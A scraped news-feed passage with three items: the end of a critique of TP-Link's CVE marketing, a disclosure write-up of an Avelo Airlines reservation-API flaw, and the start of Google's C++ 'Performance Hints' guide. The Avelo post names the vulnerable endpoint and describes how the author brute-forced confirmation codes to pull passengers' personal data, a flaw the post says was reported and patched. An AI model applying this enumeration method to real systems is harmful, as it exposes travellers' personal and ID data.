<p>On their <a target="_blank" rel="noopener" href="https://www.tp-link.com/us/landing/security-commitment/">Security Commitment page</a>, TP-Link prominently displays charts comparing their CVE count to competitors. They explicitly market themselves as having fewer CVEs than Cisco, Netgear, and D-Link. They state they “aim to patch vulnerabilities within 90 days.”</p>
<p>There’s an obvious and structural conflict of interest when a vendor is allowed to be their own CNA while simultaneously using their CVE count as a marketing metric.</p>

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Reverse Engineering US Airline's PNR System and Accessing All Reservations (116 pts)]]></title>
            <link>https://alexschapiro.com/security/vulnerability/2025/11/20/avelo-airline-reservation-api-vulnerability</link>
            <guid>46328992</guid>
            <pubDate>Fri, 19 Dec 2025 18:15:17 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://alexschapiro.com/security/vulnerability/2025/11/20/avelo-airline-reservation-api-vulnerability">https://alexschapiro.com/security/vulnerability/2025/11/20/avelo-airline-reservation-api-vulnerability</a>, See on <a href="https://news.ycombinator.com/item?id=46328992">Hacker News</a></p>
<div id="readability-page-1" class="page"><div aria-label="Content">
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p><em>Timeline &amp; Responsible Disclosure</em></p>

<p><em><strong>Initial Contact:</strong> Upon discovering this vulnerability on <strong>October 15, 2025</strong>, I immediately reached out to security contacts at Avelo Airlines via email.</em></p>

<p><em><strong>October 16, 2025:</strong> The Avelo cybersecurity team responded quickly and professionally. We had productive email exchanges where I detailed the vulnerability, including the lack of last name verification and rate limiting on reservation endpoints.</em></p>

<p><em><strong>November 13, 2025:</strong> Avelo pushed a fix to production and notified me that the vulnerabilities were patched. I independently verified the fixes were in place before publication, and informed the Avelo team of my intention to write a technical blog post about this vulnerability, highlighting their cooperative and responsive approach to security disclosure.</em></p>

<p><em><strong>Publication:</strong> November 20, 2025.</em></p>

<p><em>The Avelo team was responsive, professional, and took the findings seriously throughout the disclosure process. They acknowledged the severity, worked quickly to remediate the issues, and maintained clear communication. This is a model example of how organizations should handle security disclosures.</em></p>

<hr>

<p>After my <a href="https://coursetable.com/catalog?selectSeasons=202503&amp;searchText=akkad&amp;course-modal=202503-13154">9 AM Akkadian class</a>, I sat down to change my flight out of New Haven with Avelo Airlines, and noticed that my computer was making some unusual requests. After digging a little further, I stepped into a landmine of customer information exposure. In the wrong hands, this critical vulnerability could allow an attacker to access full reservation details, including PII, government ID numbers, and partial payment info, for every Avelo passenger, past and present.</p>

<p>Before I walk you through my work on that Tuesday morning, let’s establish how airlines generally manage their reservations.</p>

<h2 id="how-airline-logins-should-work">How Airline Logins <em>Should</em> Work</h2>

<p>Normally, to access a flight reservation (which often contains sensitive information like passport numbers, Known Traveler Numbers, and partial credit card data), you need at least two pieces of information: a <strong>confirmation code</strong> and the <strong>passenger’s last name</strong>.</p>

<p>This two-factor system is generally secure. The space of all 6-character alphanumeric confirmation codes combined with all possible last names is astronomically large, making it impossible to “guess” a valid pair.</p>

<p>But what if the last name check was missing?</p>

<p>Suddenly, the problem becomes much simpler. The <em>entire</em> keyspace an attacker needs to guess is just the confirmation code. In Avelo’s case, their codes are 6-character alphanumeric strings (<code>[A-Z0-9]</code>).</p>

<p>Let’s do the math:</p>

<ul>
  <li><strong>Keyspace:</strong> 36 characters (26 letters + 10 digits)</li>
  <li><strong>Length:</strong> 6</li>
  <li><strong>Total Combinations:</strong> 36^6 = <strong>2,176,782,336</strong> (~2.18 billion)</li>
</ul>

<p>That’s a big number, but it’s not “astronomically large.” It’s well within the reach of a modern brute-force attack.</p>

<h3 id="the-attack-timeline">The Attack Timeline</h3>

<p>How long would it take to try all 2.18 billion combinations? The time is just <code>2.18 billion / (requests per second)</code>.</p>

<ul>
  <li>At <strong>1,000 req/s</strong> (a modest script): 2.18 million seconds, or <strong>~25 days</strong>.</li>
  <li>At <strong>10,000 req/s</strong> (a decent server): 218,000 seconds, or <strong>~2.5 days</strong>.</li>
  <li>At <strong>100,000 req/s</strong> (a small cluster of servers, costing $400-$700)<sup id="fnref:1" role="doc-noteref"><a href="#fn:1" rel="footnote">1</a></sup>: 21,800 seconds, or <strong>~6 hours</strong>.</li>
</ul>

<p><strong>Bottom line:</strong> If Avelo’s flight system has no rate limiting and doesn’t require a last name, an adversary could extract all passenger data in about 6 hours for less than a thousand dollars.</p>

<h3 id="even-faster-than-6-hours">Even Faster Than 6 Hours</h3>

<p>Even worse, they don’t need to run for 6 hours. With an estimated 8 million tickets sold, the “hit rate” is roughly <strong>1 in every 270 guesses</strong> (2.18B / 8M). An attacker would start getting valid PII back in <em>seconds</em>.</p>

<h2 id="back-to-the-story-finding-the-flaw">Back to the Story: Finding the Flaw</h2>

<p>This was all just theory until I looked at my network traffic. As I was changing my reservation, I saw a GET request to an API endpoint:</p>

<div><pre><code>https://www.aveloair.com/payment/services/reservation/{code}
</code></pre></div>

<p><img src="https://alexschapiro.com/assets/images/avelo-security/endpoint.png" alt="Screenshot of the reservation API endpoint"></p>

<p>The parameter at the end didn’t seem like a reservation code, but the response contained all relevant reservation data, so I decided to probe further. On a hunch, I swapped that token for my <em>actual</em> 6-character code and re-sent the request.</p>

<p><strong>Voila.</strong> The server responded with a massive JSON object containing my entire reservation.</p>

<p>This endpoint wasn’t asking for my last name. The only other security was a standard authentication cookie… but was that cookie tied to <em>my</em> reservation?</p>

<p>I quickly texted a friend for their old Avelo confirmation code. I plugged it into the URL, kept <em>my own cookie</em>, and hit send. But there was no way it could poss-</p>

<p><strong>It worked.</strong></p>

<p>I was looking at their full reservation. <strong>Any</strong> valid authentication cookie could be used to query <strong>any</strong> reservation, using only the 6-character code. The theoretical flaw was real.</p>

<h2 id="executing-the-attack-no-rate-limiting">Executing the Attack: No Rate Limiting</h2>

<p>The only remaining (partial) defense was rate-limiting. I wrote a quick multi-threaded Python script to generate random 6-character codes and hit the endpoint.</p>

<p>The requests flew. There was no WAF, no IP blocking, no CAPTCHA.</p>

<p><img src="https://alexschapiro.com/assets/images/avelo-security/validcodes.png" alt="Valid reservation codes being discovered">
<em>The script quickly finding valid reservation codes</em></p>

<p>Within minutes, my script was logging hundreds of valid reservations. Troves of data were being returned, including from passengers flying on government business with <code>@dot.gov</code> and <code>@faa.gov</code> email addresses.</p>

<p>A successful hit returned the <em>entire</em> reservation object. This was a complete data breach for each passenger – including myself!</p>

<p>(Note: During further testing, I discovered a similar vulnerability on a different reservation endpoint. I promptly notified the Avelo team, and they patched that endpoint as well before publication.)</p>

<h2 id="what-data-was-leaked">What Data Was Leaked?</h2>

<p>For every valid code, the API returned:</p>

<ul>
  <li><strong>Full Passenger PII:</strong> <code>FullName</code>, <code>DateOfBirth</code>, <code>Gender</code></li>
  <li><strong>Government IDs:</strong> <code>IDDocuments.IDNumber</code> (this field contained Known Traveler Numbers (KNTs) and, in other cases, Passport Numbers)</li>
  <li><strong>Contact Info:</strong> phone numbers, email addresses</li>
  <li><strong>Full Itinerary:</strong> Flight numbers, dates, times, and <code>SeatLocation</code></li>
  <li><strong>Payment Details:</strong> <code>CardNumber</code> (masked: <code>************8</code>), <code>DateTimeExpiration</code>, and billing <code>Address.PostalCode</code></li>
  <li><strong>Vouchers:</strong> <code>PaymentInternals.AccountNumber</code> and <code>Amount.Value</code></li>
  <li><strong>PCI Data:</strong> <code>PaymentCards.TrackData</code> — This field seemed to contain partial magnetic-stripe data</li>
</ul>

<div>
  <div>
    <p><img src="https://alexschapiro.com/assets/images/avelo-security/payment.png" alt="Payment card data in API response"></p><p>Example of exposed payment card data returned by the API</p>
  </div>
  <div>
    <p><img src="https://alexschapiro.com/assets/images/avelo-security/ktn.png" alt="Known Traveler Number in API response"></p><p>Example of exposed Known Traveler Number (KNT) and other PII in API response</p>
  </div>
</div>

<h2 id="the-fallout">The Fallout</h2>

<p>This flaw was critical. An attacker could:</p>

<ol>
  <li>Run the 6-hour brute-force attack to enumerate millions of valid passenger reservation codes (PNRs) — or simply run the script for a few minutes and start harvesting valid passenger data immediately</li>
  <li>Extract comprehensive PII including full names, dates of birth, contact information, flight itineraries, and government ID numbers (Known Traveler Numbers and passport numbers) for identity theft and fraud</li>
  <li>Access partial payment card data including last 4 digits, expiration dates, and billing zip codes</li>
  <li>View complete travel history and passenger boarding status</li>
  <li>Modify or cancel all Avelo passengers’ reservations, causing widespread travel disruption</li>
</ol>

<p>I immediately disclosed this to the Avelo team. They were responsive, professional, and took the findings seriously, patching the issues promptly.</p>

<h2 id="key-takeaways">Key Takeaways</h2>

<p>This incident is a stark reminder of how critical simple security checks are. A single missing <code>lastName</code> check and an absent rate-limit configuration exposed millions of sensitive passenger records to trivial enumeration.</p>

<p><strong>For developers:</strong></p>
<ul>
  <li>Always require multiple factors for accessing sensitive data (e.g., confirmation code + last name)</li>
  <li>Implement rate limiting on all enumerable endpoints</li>
  <li>Ensure authentication cookies are properly scoped to user sessions</li>
</ul>

<p>I’m glad we could get this fixed, and I hope this write-up helps other developers avoid similar pitfalls.</p>



  </div>
</article>

      </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Performance Hints (2023) (107 pts)]]></title>
            <link>https://abseil.io/fast/hints.html</link>
            <guid>46328274</guid>
            <pubDate>Fri, 19 Dec 2025 17:14:42 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://abseil.io/fast/hints.html">https://abseil.io/fast/hints.html</a>, See on <a href="https://news.ycombinator.com/item?id=46328274">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
        <!-- Code generated by tool. DO NOT EDIT. -->
<!-- mdformat global-off -->


<p><a href="https://research.google/people/jeff/">Jeff Dean</a>,
<a href="https://research.google/people/sanjayghemawat/">Sanjay Ghemawat</a></p>

<p>Original version: 2023/07/27, last updated: 2025/12/16</p>





<p>Over the years, we (Jeff &amp; Sanjay) have done a fair bit of diving into
performance tuning of various pieces of code, and improving the
performance of our software  has been important from the very earliest days of Google, since it
lets us do more for more users. We wrote this document as a way of identifying
some general principles and specific techniques that we use when doing this sort
of work, and tried to pick illustrative source code changes (change lists, or
CLs) that provide examples of the various approaches and techniques. Most of the
concrete suggestions below reference C++ types and CLs, but the general
principles apply to other languages. The document focuses on general performance
tuning in the context of a single binary, and does not cover distributed systems
or machine learning (ML) hardware performance tuning (huge areas unto
themselves). We hope others will find this useful.</p>

<p><em>Many of the examples in the document have code fragments that demonstrate the
techniques (click the little triangles!).</em> <em>Note that some of these
code fragments mention various internal Google codebase abstractions. We have
included these anyway if we felt like the examples were self-contained enough to
be understandable to those unfamiliar with the details of those abstractions.</em></p>

<h2 id="the-importance-of-thinking-about-performance">The importance of thinking about performance</h2>

<p>Knuth is often quoted out of context as saying <em>premature optimization is the
root of all evil</em>. The
<a href="https://dl.acm.org/doi/pdf/10.1145/356635.356640">full quote</a> reads: <em>“We
should forget about small efficiencies, say about 97% of the time: premature
optimization is the root of all evil. Yet we should not pass up our
opportunities in that critical 3%.”</em> This document is about that critical
3%, and a more compelling quote,
again from Knuth, reads:</p>

<blockquote>
  <p>The improvement in speed from Example 2 to Example 2a is only about 12%, and
many people would pronounce that insignificant. The conventional wisdom shared
by many of today’s software engineers calls for ignoring efficiency in the
small; but I believe this is simply an overreaction to the abuses they see
being practiced by penny-wise-and-pound-foolish programmers, who can’t debug
or maintain their “optimized” programs. In established engineering disciplines
a 12% improvement, easily obtained, is never considered marginal; and I
believe the same viewpoint should prevail in software engineering. Of course I
wouldn’t bother making such optimizations on a one-shot job, but when it’s a
question of preparing quality programs, I don’t want to restrict myself to
tools that deny me such efficiencies.</p>
</blockquote>

<p>Many people will say “let’s write down the code in as simple a way as possible
and deal with performance later when we can profile”. However, this approach is
often wrong:</p>

<ol>
  <li>If you disregard all performance concerns when developing a large system,
you will end up with a flat profile where there are no obvious hotspots
because performance is lost all over the place. It will be difficult to
figure out how to get started on performance improvements.</li>
  <li>If you are developing a library that will be used by other people, the
people who will run into performance problems will be likely to be people
who cannot easily make performance improvements (they will have to
understand the details of code written by other people/teams, and have to
negotiate with them about the importance of performance optimizations).</li>
  <li>It is harder to make significant changes to a system when it is in heavy
use.</li>
  <li>It is also hard to tell if there are performance problems that can be solved
easily and so we end up with potentially expensive solutions like
over-replication or severe overprovisioning of a service to handle load
problems.</li>
</ol>

<p>Instead, we suggest that when writing code, try to choose the faster alternative
if it does not impact readability/complexity of the code significantly.</p>

<h2 id="estimation">Estimation</h2>

<p>If you can develop an intuition for how much performance might matter in the
code you are writing, you can make a more informed decision (e.g., how much
extra complexity is warranted in the name of performance). Some tips on
estimating performance while you are writing code:</p>

<ul>
  <li>Is it test code? If so, you need to worry mostly about the asymptotic
complexity of your algorithms and data structures. (Aside: development cycle
time matters, so avoid writing tests that take a long time to run.)</li>
  <li>Is it code specific to an application? If so, try to figure out how much
performance matters for this piece of code. This is typically not very hard:
just figuring out whether code is initialization/setup code vs. code that
will end up on hot paths (e.g., processing every request in a service) is
often sufficient</li>
  <li>Is it library code that will be used by many applications? In this case it
is hard to tell how sensitive it might become. This is where it becomes
especially important to follow some of the simple techniques described in
this document. For example, if you need to store a vector that usually has a
small number of elements, use an absl::InlinedVector instead of std::vector.
Such techniques are not very hard to follow and don’t add any non-local
complexity to the system. And if it turns out that the code you are writing
does end up using significant resources, it will be higher performance from
the start. And it will be easier to find the next thing to focus on when
looking at a profile.</li>
</ul>

<p>You can do a slightly deeper analysis when picking between options with
potentially different performance characteristics by relying on
<a href="https://en.wikipedia.org/wiki/Back-of-the-envelope_calculation">back of the envelope calculations</a>.
Such calculations can quickly give a very rough estimate of the performance of
different alternatives, and the results can be used to discard some of the
alternatives without having to implement them.</p>

<p>Here is how such an estimation might work:</p>

<ol>
  <li>Estimate how many low-level operations of various kinds are required, e.g.,
number of disk seeks, number of network round-trips, bytes transmitted etc.</li>
  <li>Multiply each kind of expensive operation with its rough cost, and add the
results together.</li>
  <li>The preceding gives the <em>cost</em> of the system in terms of resource usage. If
you are interested in latency, and if the system has any concurrency, some
of the costs may overlap and you may have to do slightly more complicated
analysis to estimate the latency.</li>
</ol>

<p>The following table, which is an updated version of a table from a
<a href="https://static.googleusercontent.com/media/research.google.com/en//people/jeff/stanford-295-talk.pdf">2007 talk at Stanford University</a>
(video of the 2007 talk no longer exists, but there is a
<a href="https://www.youtube.com/watch?v=modXC5IWTJI">video of a related 2011 Stanford talk that covers some of the same content</a>)
may be useful since it lists the types of operations to consider, and their
rough cost:</p>

<div><pre><code>L1 cache reference                             0.5 ns
L2 cache reference                             3 ns
Branch mispredict                              5 ns
Mutex lock/unlock (uncontended)               15 ns
Main memory reference                         50 ns
Compress 1K bytes with Snappy              1,000 ns
Read 4KB from SSD                         20,000 ns
Round trip within same datacenter         50,000 ns
Read 1MB sequentially from memory         64,000 ns
Read 1MB over 100 Gbps network           100,000 ns
Read 1MB from SSD                      1,000,000 ns
Disk seek                              5,000,000 ns
Read 1MB sequentially from disk       10,000,000 ns
Send packet CA-&gt;Netherlands-&gt;CA      150,000,000 ns
</code></pre></div>

<p>The preceding table contains rough costs for some basic low-level operations.
You may find it useful to also track estimated costs for higher-level operations
relevant to your system. E.g., you might want to know the rough cost of a point
read from your SQL database, the latency of interacting with a Cloud service, or
the time to render a simple HTML page. If you don’t know the relevant cost of
different operations, you can’t do decent back-of-the-envelope calculations!</p>

<h3 id="example-time-to-quicksort-a-billion-4-byte-numbers">Example: Time to quicksort a billion 4 byte numbers</h3>

<p>As a rough approximation, a good quicksort algorithm makes log(N) passes over an
array of size N. On each pass, the array contents will be streamed from memory
into the processor cache, and the partition code will compare each element once
to a pivot element. Let’s add up the dominant costs:</p>

<ol>
  <li>Memory bandwidth: the array occupies 4 GB (4 bytes per number times a
billion numbers). Let’s assume ~16GB/s of memory bandwidth per core. That
means each pass will take ~0.25s. N is ~2^30, so we will make ~30 passes, so
the total cost of memory transfer will be ~7.5 seconds.</li>
  <li>Branch mispredictions: we will do a total of N*log(N) comparisons, i.e., ~30
billion comparisons. Let’s assume that half of them (i.e., 15 billion) are
mispredicted. Multiplying by 5 ns per misprediction, we get a misprediction
cost of 75 seconds. We assume for this analysis that correctly predicted
branches are free.</li>
  <li>Adding up the previous numbers, we get an estimate of ~82.5 seconds.</li>
</ol>

<p>If necessary, we could refine our analysis to account for processor caches. This
refinement is probably not needed since branch mispredictions are the dominant
cost according to the analysis above, but we include it here anyway as another
example. Let’s assume we have a 32MB L3 cache, and that the cost of transferring
data from L3 cache to the processor is negligible. The L3 cache can hold 2^23
numbers, and therefore the last 22 passes can operate on the data resident in
the L3 cache (the 23rd last pass brings data into the L3 cache and the remaining
passes operate on that data.) That cuts down the memory transfer cost to 2.5
seconds (10 memory transfers of 4GB at 16GB/s) instead of 7.5 seconds (30 memory
transfers).</p>

<h3 id="example-time-to-generate-a-web-page-with-30-image-thumbnails">Example: Time to generate a web page with 30 image thumbnails</h3>

<p>Let’s compare two potential designs where the original images are stored on
disk, and each image is approximately 1MB in size.</p>

<ol>
  <li>Read the contents of the 30 images serially and generate a thumbnail for
each one. Each read takes one seek + one transfer, which adds up to 5ms for
the seek, and 10ms for the transfer, which adds up to 30 images times 15ms
per image, i.e., 450ms.</li>
  <li>Read in parallel, assuming the images are spread evenly across K disks. The
previous resource usage estimate still holds, but latency will drop by
roughly a factor of K, ignoring variance (e.g, we will sometimes get unlucky
and one disk will have more than 1/Kth of the images we are reading).
Therefore if we are running on a distributed filesystem with hundreds of
disks, the expected latency will drop to ~15ms.</li>
  <li>Let’s consider a variant where all images are on a single SSD. This changes
the sequential read performance to 20µs + 1ms per image, which adds up to
~30 ms overall.</li>
</ol>

<h2 id="measurement">Measurement</h2>

<p>The preceding section gives some tips about how to think about performance when
writing code without worrying too much about how to measure the performance
impact of your choices. However, before you actually start making improvements,
or run into a tradeoff involving various things like performance, simplicity,
etc. you will want to measure or estimate potential performance benefits. Being
able to measure things effectively is the number one tool you’ll want to have in
your arsenal when doing performance-related work.</p>

<p>As an aside, it’s worth pointing out that profiling code that you’re unfamiliar
with can also be a good way of getting a general sense of the structure of the
codebase and how it operates. Examining the source code of heavily involved
routines in the dynamic call graph of a program can give you a high level sense
of “what happens” when running the code, which can then build your own
confidence in making performance-improving changes in slightly unfamiliar code.</p>

<h3 id="profiling-tools-and-tips">Profiling tools and tips</h3>

<p>Many useful profiling tools are available. A useful tool to reach for first is
<a href="https://github.com/google/pprof/blob/main/doc/README.md">pprof</a> since it gives
good high level performance information and is easy to use both locally and for
code running in production. Also try
<a href="https://perf.wiki.kernel.org/index.php/Main_Page">perf</a> if you want more
detailed insight into performance.</p>

<p>Some tips for profiling:</p>

<ul>
  <li>Build production binaries with appropriate debugging information and
optimization flags.</li>
  <li>If you can, write a <a href="https://abseil.io/fast/75">microbenchmark</a> that covers the code you are
improving. Microbenchmarks improve turnaround time when making performance
improvements, help verify the impact of performance improvements, and can
help prevent future performance regressions. However microbenchmarks can
have <a href="https://abseil.io/fast/39">pitfalls</a> that make them non-representative of full system
performance. Useful libraries for writing microbenchmarks:
<a href="https://github.com/google/benchmark/blob/main/README.md">C++</a> <a href="https://pkg.go.dev/testing#hdr-Benchmarks">Go</a> <a href="https://github.com/openjdk/jmh">Java</a>.</li>
  <li>
    <p>Use a benchmark library to <a href="https://abseil.io/fast/53">emit performance counter readings</a> both
for better precision, and to get more insight into program behavior.</p>
  </li>
  <li>Lock contention can often artificially lower CPU usage. Some mutex
implementations provide support for profiling lock contention.</li>
  <li>Use <a href="https://www.tensorflow.org/tensorboard/tensorboard_profiling_keras#debug_performance_bottlenecks">ML profilers</a> for machine learning performance work .</li>
</ul>

<h3 id="what-to-do-when-profiles-are-flat">What to do when profiles are flat</h3>

<p>You will often run into situations where your CPU profile is flat (there is no
obvious big contributor to slowness). This can often happen when all low-hanging
fruit has been picked. Here are some tips to consider if you find yourself in
this situation:</p>

<ul>
  <li>Don’t discount the value of many small optimizations! Making twenty separate
1% improvements in some subsystem is often eminently possible and
collectively mean a pretty sizable improvement (work of this flavor often
relies on having stable and high quality microbenchmarks). Some examples of
these sorts of changes are in the
<a href="#cls-that-demonstrate-multiple-techniques">changes that demonstrate multiple techniques</a>
section.</li>
  <li>Find loops closer to the top of call stacks (flame graph view of a CPU
profile can be helpful here). Potentially, the loop or the code it calls
could be restructured to be more efficient. Some code that initially built a
complicated graph structure incrementally by looping over nodes and edges of
the input was changed to build the graph structure in one shot by passing it
the entire input. This removed a bunch of internal checks that were
happening per edge in the initial code.</li>
  <li>Take a step back and look for structural changes higher up in the call
stacks instead of concentrating on micro-optimizations. The techniques
listed under <a href="#algorithmic-improvements">algorithmic improvements</a> can be
useful when doing this.</li>
  <li>Look for overly general code. Replace it with a customized or lower-level
implementation. E.g., if an application is repeatedly using a regular
expression match where a simple prefix match would suffice, consider
dropping the use of the regular expression.</li>
  <li>Attempt to reduce the number of allocations:
<a href="https://gperftools.github.io/gperftools/heapprofile.html">get an allocation profile</a>, and pick away at the highest
contributor to the number of allocations. This will have two effects: (1) It
will provide a direct reduction of the amount of time spent in the allocator
(and garbage collector for GC-ed languages) (2) There will often be a
reduction in cache misses since in a long running program using tcmalloc,
every allocation tends to go to a different cache line.</li>
  <li>Gather other types of profiles, specially ones based on hardware performance
counters. Such profiles may point out functions that are encountering a high
cache miss rate. Techniques described in the
<a href="#profiling-tools-and-tips">profiling tools and tips</a> section can be
helpful.</li>
</ul>

<h2 id="api-considerations">API considerations</h2>

<p>Some of the techniques suggested below require changing data structures and
function signatures, which may be disruptive to callers. Try to organize code so
that the suggested performance improvements can be made inside an encapsulation
boundary without affecting public interfaces. This will be easier if your
<a href="https://web.stanford.edu/~ouster/cgi-bin/book.php">modules are deep</a>
(significant functionality accessed via a narrow interface).</p>

<p>Widely used APIs come under heavy pressure to add features. Be
careful when adding new features since these will constrain future
implementations and increase cost unnecessarily for users who don’t need the new
features. E.g., many C++ standard library containers promise iterator stability,
which in typical implementations increases the number of allocations
significantly, even though many users do not need pointer stability.</p>

<p>Some specific techniques are listed below. Consider carefully the performance
benefits vs. any API usability issues introduced by such changes.</p>

<h3 id="bulk-apis">Bulk APIs</h3>

<p>Provide bulk ops to reduce expensive API boundary crossings or to take advantage
of algorithmic improvements.</p>

<details>
<summary><p>Add bulk MemoryManager::LookupMany interface.</p>
</summary>

<p>In addition to adding a bulk interface, this also simplified the signature for
the new bulk variant: it turns out clients only needed to know if all the keys
were found, so we can return a bool rather than a Status object.</p>
<p>memory_manager.h</p>

<div>
<pre><code>class MemoryManager {
 public:
  ...
  util::StatusOr&lt;LiveTensor&gt; Lookup(const TensorIdProto&amp; id);
</code></pre>
</div>

<div>
<pre><code>class MemoryManager {
 public:
  ...
  util::StatusOr&lt;LiveTensor&gt; Lookup(const TensorIdProto&amp; id);

  // Lookup the identified tensors
  struct LookupKey {
    ClientHandle client;
    uint64 local_id;
  };
  bool LookupMany(absl::Span&lt;const LookupKey&gt; keys,
                  absl::Span&lt;tensorflow::Tensor&gt; tensors);
</code></pre>
</div>


</details>

<details>
<summary><p>Add bulk ObjectStore::DeleteRefs API to amortize locking
overhead.</p>
</summary>

<p>object_store.h</p>

<div>
<pre><code>template &lt;typename T&gt;
class ObjectStore {
 public:
  ...
  absl::Status DeleteRef(Ref);
</code></pre>
</div>

<div>
<pre><code>template &lt;typename T&gt;
class ObjectStore {
 public:
  ...
  absl::Status DeleteRef(Ref);

  // Delete many references.  For each ref, if no other Refs point to the same
  // object, the object will be deleted.  Returns non-OK on any error.
  absl::Status DeleteRefs(absl::Span&lt;const Ref&gt; refs);
  ...
template &lt;typename T&gt;
absl::Status ObjectStore&lt;T&gt;::DeleteRefs(absl::Span&lt;const Ref&gt; refs) {
  util::Status result;
  absl::MutexLock l(&amp;mu_);
  for (auto ref : refs) {
    result.Update(DeleteRefLocked(ref));
  }
  return result;
}
</code></pre>
</div>

<p>memory_tracking.cc</p>

<div>
<pre><code>void HandleBatch(int, const plaque::Batch&amp; input) override {
  for (const auto&amp; t : input) {
    auto in = In(t);
    PLAQUE_OP_ASSIGN_OR_RETURN(const auto&amp; handles, in.handles());
    for (const auto handle : handles.value-&gt;handles()) {
      PLAQUE_OP_RETURN_IF_ERROR(in_buffer_store_
                                    ? bstore_-&gt;DeleteRef(handle)
                                    : tstore_-&gt;DeleteRef(handle));
    }
  }
}
</code></pre>
</div>

<div>
<pre><code>void HandleBatch(int, const plaque::Batch&amp; input) override {
  for (const auto&amp; t : input) {
    auto in = In(t);
    PLAQUE_OP_ASSIGN_OR_RETURN(const auto&amp; handles, in.handles());
    if (in_buffer_store_) {
      PLAQUE_OP_RETURN_IF_ERROR(
          bstore_-&gt;DeleteRefs(handles.value-&gt;handles()));
    } else {
      PLAQUE_OP_RETURN_IF_ERROR(
          tstore_-&gt;DeleteRefs(handles.value-&gt;handles()));
    }
  }
}
</code></pre>
</div>


</details>

<details>
<summary><p>Use <a href="https://en.wikipedia.org/wiki/Heapsort#Variations">Floyd's
heap construction</a> for efficient initialization.</p>
</summary>

<p>Bulk initialization of a heap can be done in O(N) time, whereas adding one
element at a time and updating the heap property after each addition requires
O(N lg(N)) time.</p>

</details>

<p>Sometimes it is hard to change callers to use a new bulk API directly. In that
case it might be beneficial to use a bulk API internally and cache the results
for use in future non-bulk API calls:</p>

<details>
<summary><p>Cache block decode results for use in future calls.</p>
</summary>

<p>Each lookup needs to decode a whole block of K entries. Store the decoded
entries in a cache and consult the cache on future lookups.</p>
<p>lexicon.cc</p>

<div>
<pre><code>void GetTokenString(int pos, std::string* out) const {
  ...
  absl::FixedArray&lt;LexiconEntry, 32&gt; entries(pos + 1);

  // Decode all lexicon entries up to and including pos.
  for (int i = 0; i &lt;= pos; ++i) {
    p = util::coding::TwoValuesVarint::Decode32(p, &amp;entries[i].remaining,
                                                &amp;entries[i].shared);
    entries[i].remaining_str = p;
    p += entries[i].remaining;  // remaining bytes trail each entry.
  }
</code></pre>
</div>

<div>
<pre><code>mutable std::vector&lt;absl::InlinedVector&lt;std::string, 16&gt;&gt; cache_;
...
void GetTokenString(int pos, std::string* out) const {
  ...
  DCHECK_LT(skentry, cache_.size());
  if (!cache_[skentry].empty()) {
    *out = cache_[skentry][pos];
    return;
  }
  ...
  // Init cache.
  ...
  const char* prev = p;
  for (int i = 0; i &lt; block_sz; ++i) {
    uint32 shared, remaining;
    p = TwoValuesVarint::Decode32(p, &amp;remaining, &amp;shared);
    auto&amp; cur = cache_[skentry].emplace_back();
    gtl::STLStringResizeUninitialized(&amp;cur, remaining + shared);

    std::memcpy(cur.data(), prev, shared);
    std::memcpy(cur.data() + shared, p, remaining);
    prev = cur.data();
    p += remaining;
  }
  *out = cache_[skentry][pos];
</code></pre>
</div>


</details>

<h3 id="view-types">View types</h3>

<p>Prefer view types (e.g., <code>std::string_view</code>, <code>std::Span&lt;T&gt;</code>,
<code>absl::FunctionRef&lt;R(Args...)&gt;</code>) for function arguments (unless ownership of the
data is being transferred). These types reduce copying, and allow callers to
pick their own container types (e.g., one caller might use <code>std::vector</code> whereas
another one uses <code>absl::InlinedVector</code>).</p>

<h3 id="pre-allocatedpre-computed-arguments">Pre-allocated/pre-computed arguments</h3>

<p>For frequently called routines, sometimes it is useful to allow higher-level
callers to pass in a data structure that they own or information that the called
routine needs that the client already has. This can avoid the low-level routine
being forced to allocate its own temporary data structure or recompute
already-available information.</p>

<details>
<summary><p>Add RPC_Stats::RecordRPC variant allowing client to pass in
already available WallTime value.</p>
</summary>

<p>rpc-stats.h</p>

<div>
<pre><code>static void RecordRPC(const Name &amp;name, const RPC_Stats_Measurement&amp; m);
</code></pre>
</div>

<div>
<pre><code>static void RecordRPC(const Name &amp;name, const RPC_Stats_Measurement&amp; m,
                      WallTime now);
</code></pre>
</div>

<p>clientchannel.cc</p>

<div>
<pre><code>const WallTime now = WallTime_Now();
...
RPC_Stats::RecordRPC(stats_name, m);
</code></pre>
</div>

<div>
<pre><code>const WallTime now = WallTime_Now();
...
RPC_Stats::RecordRPC(stats_name, m, now);
</code></pre>
</div>


</details>

<h3 id="thread-compatible-vs-thread-safe-types">Thread-compatible vs. Thread-safe types</h3>

<p>A type may be either thread-compatible (synchronized externally) or thread-safe
(synchronized internally). Most generally used types should be
thread-compatible. This way callers who do not need thread-safety don’t pay for
it.</p>

<details>
<summary><p>Make a class thread-compatible since callers are already
synchronized.</p>
</summary>

<p>hitless-transfer-phase.cc</p>

<div>
<pre><code>TransferPhase HitlessTransferPhase::get() const {
  static CallsiteMetrics cm("HitlessTransferPhase::get");
  MonitoredMutexLock l(&amp;cm, &amp;mutex_);
  return phase_;
}
</code></pre>
</div>

<div>
<pre><code>TransferPhase HitlessTransferPhase::get() const { return phase_; }
</code></pre>
</div>

<p>hitless-transfer-phase.cc</p>

<div>
<pre><code>bool HitlessTransferPhase::AllowAllocate() const {
  static CallsiteMetrics cm("HitlessTransferPhase::AllowAllocate");
  MonitoredMutexLock l(&amp;cm, &amp;mutex_);
  return phase_ == TransferPhase::kNormal || phase_ == TransferPhase::kBrownout;
}
</code></pre>
</div>

<div>
<pre><code>bool HitlessTransferPhase::AllowAllocate() const {
  return phase_ == TransferPhase::kNormal || phase_ == TransferPhase::kBrownout;
}
</code></pre>
</div>


</details>

<p>However if the typical use of a type needs synchronization, prefer to move the
synchronization inside the type. This allows the synchronization mechanism to be
tweaked as necessary to improve performance (e.g., sharding to reduce
contention) without affecting callers.</p>

<h2 id="algorithmic-improvements">Algorithmic improvements</h2>

<p>The most critical opportunities for performance improvements come from
algorithmic improvements, e.g., turning an O(N²) algorithm to O(N lg(N)) or
O(N), avoiding potentially exponential behavior, etc. These opportunities are
rare in stable code, but are worth paying attention to when writing new code. A
few examples that show such improvements to pre-existing code:</p>

<details>
<summary><p>Add nodes to cycle detection structure in reverse
post-order.</p>
</summary>

